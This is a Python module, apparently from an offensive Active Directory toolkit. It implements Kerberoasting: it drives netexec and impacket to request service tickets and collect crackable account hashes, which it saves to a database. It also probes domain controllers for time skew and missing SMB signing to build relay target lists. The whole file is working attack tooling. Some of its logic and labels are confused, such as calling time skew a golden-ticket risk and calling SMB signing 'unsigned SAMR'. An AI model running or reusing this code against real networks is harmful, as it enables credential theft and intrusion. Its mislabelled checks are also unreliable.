"""
Implementation of time-based attacks against Active Directory.
Provides Kerberoasting (TGS-REP) and time synchronization attacks.
Uses netexec for efficient enumeration and custom implementations
for specialized attacks.
"""

from typing import List, Dict, Optional, Callable
from .attack_base import AttackBase
import subprocess
import threading
import json
from datetime import datetime
import ntplib
import struct
import socket
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5 import constants
from impacket.krb5.types import Principal
from pyasn1.codec.der import decoder

class TimeAttacks(AttackBase):
    def __init__(self):
        super().__init__()
        self.stop_attack = False
        self.attack_thread = None
        self.results = {
            'kerberoast': [],
            'time_skew': [],
            'errors': []
        }
        
    def kerberoast(self, target: str, username: str = None, password: str = None,
                   callback: Optional[Callable] = None) -> bool:
        """
        Perform Kerberoasting attack using netexec and custom implementation
        
        Args:
            target: Target domain/DC
            username: Optional username for authentication
            password: Optional password for authentication
            callback: Optional callback for real-time updates
        """
        self.stop_attack = False
        self.results = {'kerberoast': [], 'time_skew': [], 'errors': []}
        
        def roast_thread():
            try:
                # First use netexec to find SPN accounts
                cmd = [
                    'netexec', 'ldap', target,
                    '--kerberoasting',
                    '--json'
                ]
                
                if username and password:
                    cmd.extend(['-u', username, '-p', password])
                
                self.log_status("Starting Kerberoasting enumeration...")
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
                while not self.stop_attack:
                    output = process.stdout.readline()
                    if not output and process.poll() is not None:
                        break
                        
                    if output:
                        try:
                            result = json.loads(output)
                            if 'kerberoast' in result:
                                for hash_entry in result['kerberoast']:
                                    roast_result = {
                                        'username': hash_entry.get('username'),
                                        'spn': hash_entry.get('spn'),
                                        'hash': hash_entry.get('hash'),
                                        'timestamp': datetime.now().isoformat()
                                    }
                                    self.results['kerberoast'].append(roast_result)
                                    
                                    # Save to database
                                    self.db.add_ticket_hash(
                                        username=roast_result['username'],
                                        spn=roast_result['spn'],
                                        hash_data=roast_result['hash'],
                                        attack_type='Kerberoasting'
                                    )
                                    
                                    if callback:
                                        callback('hash', roast_result)
                                        
                        except json.JSONDecodeError:
                            if callback:
                                callback('status', output.decode().strip())
                                
                process.terminate()
                
                # If we have credentials, try custom implementation for additional checks
                if username and password:
                    self._custom_kerberoast(target, username, password, callback)
                    
                # Log summary
                self.log_success(
                    f"Kerberoasting complete:\n"
                    f"- Hashes obtained: {len(self.results['kerberoast'])}\n"
                    f"- Errors: {len(self.results['errors'])}"
                )
                
            except Exception as e:
                self.log_error(f"Kerberoasting error: {str(e)}")
                if callback:
                    callback('error', {'error': str(e)})
                    
        self.attack_thread = threading.Thread(target=roast_thread)
        self.attack_thread.start()
        return True
        
    def check_time_sync(self, target: str, callback: Optional[Callable] = None) -> bool:
        """
        Check time synchronization and look for time-based vulnerabilities
        
        Args:
            target: Target domain/DC
            callback: Optional callback for real-time updates
        """
        self.stop_attack = False
        
        def time_thread():
            try:
                # Check NTP synchronization
                ntp_client = ntplib.NTPClient()
                dc_response = ntp_client.request(target, version=3)
                local_time = datetime.now().timestamp()
                
                time_diff = abs(dc_response.tx_time - local_time)
                
                result = {
                    'target': target,
                    'time_diff': time_diff,
                    'timestamp': datetime.now().isoformat()
                }
                
                if time_diff > 300:  # 5 minutes
                    result['vulnerable'] = True
                    result['description'] = 'Time skew > 5 minutes, potential for golden ticket attacks'
                    self.log_warning(f"Large time skew detected: {time_diff:.2f} seconds")
                else:
                    result['vulnerable'] = False
                    
                self.results['time_skew'].append(result)
                
                # Save to database
                self.db.add_time_check(
                    target=target,
                    time_diff=time_diff,
                    metadata=result
                )
                
                if callback:
                    callback('time_check', result)
                    
                # Check for other time-based issues
                self._check_time_vulnerabilities(target, callback)
                
            except Exception as e:
                self.log_error(f"Time sync check error: {str(e)}")
                if callback:
                    callback('error', {'error': str(e)})
                    
        self.attack_thread = threading.Thread(target=time_thread)
        self.attack_thread.start()
        return True
        
    def _custom_kerberoast(self, target: str, username: str, password: str,
                          callback: Optional[Callable] = None):
        """Custom Kerberoasting implementation for additional checks"""
        try:
            # Get TGT first
            tgt = getKerberosTGT(username, password, domain=target)
            
            # Query for SPNs using LDAP
            cmd = [
                'netexec', 'ldap', target,
                '-u', username,
                '-p', password,
                '--trusted-for-delegation',
                '--json'
            ]
            
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            spn_accounts = []
            
            while not self.stop_attack:
                output = process.stdout.readline()
                if not output and process.poll() is not None:
                    break
                    
                if output:
                    try:
                        result = json.loads(output)
                        if 'delegation' in result:
                            spn_accounts.extend(result['delegation'])
                    except json.JSONDecodeError:
                        pass
                        
            process.terminate()
            
            # Request TGS for each SPN
            for account in spn_accounts:
                if self.stop_attack:
                    break
                    
                try:
                    spn = account.get('spn')
                    if not spn:
                        continue
                        
                    tgs = getKerberosTGS(
                        Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value),
                        domain=target,
                        tgt=tgt
                    )
                    
                    if tgs:
                        # Extract hash from TGS
                        enc_part = decoder.decode(tgs['ticket']['enc-part']['cipher'])[0]
                        
                        roast_result = {
                            'username': account.get('username'),
                            'spn': spn,
                            'hash': enc_part.hex(),
                            'timestamp': datetime.now().isoformat(),
                            'encryption_type': tgs['ticket']['enc-part']['etype']
                        }
                        
                        self.results['kerberoast'].append(roast_result)
                        
                        # Save to database
                        self.db.add_ticket_hash(
                            username=roast_result['username'],
                            spn=roast_result['spn'],
                            hash_data=roast_result['hash'],
                            attack_type='Kerberoasting',
                            metadata={'encryption_type': roast_result['encryption_type']}
                        )
                        
                        if callback:
                            callback('hash', roast_result)
                            
                except Exception as e:
                    self.log_error(f"Error getting TGS for {spn}: {str(e)}")
                    
        except Exception as e:
            self.log_error(f"Custom Kerberoasting error: {str(e)}")
            
    def _check_time_vulnerabilities(self, target: str, callback: Optional[Callable] = None):
        """Check for additional time-based vulnerabilities"""
        try:
            # Check for unsigned SAMR
            cmd = ['netexec', 'smb', target, '--gen-relay-list', '--json']
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            while not self.stop_attack:
                output = process.stdout.readline()
                if not output and process.poll() is not None:
                    break
                    
                if output:
                    try:
                        result = json.loads(output)
                        if result.get('signing') is False:
                            vuln = {
                                'target': target,
                                'type': 'vulnerability',
                                'name': 'unsigned_samr',
                                'description': 'SMB signing not required, potential for time-based relay attacks',
                                'severity': 'High'
                            }
                            self.results['time_skew'].append(vuln)
                            if callback:
                                callback('vulnerability', vuln)
                    except json.JSONDecodeError:
                        pass
                        
            process.terminate()
            
        except Exception as e:
            self.log_error(f"Time vulnerability check error: {str(e)}")
            
    def stop(self):
        """Stop any running time-based attacks"""
        self.stop_attack = True
        if self.attack_thread and self.attack_thread.is_alive():
            self.attack_thread.join()
            self.log_status("Time attack stopped") 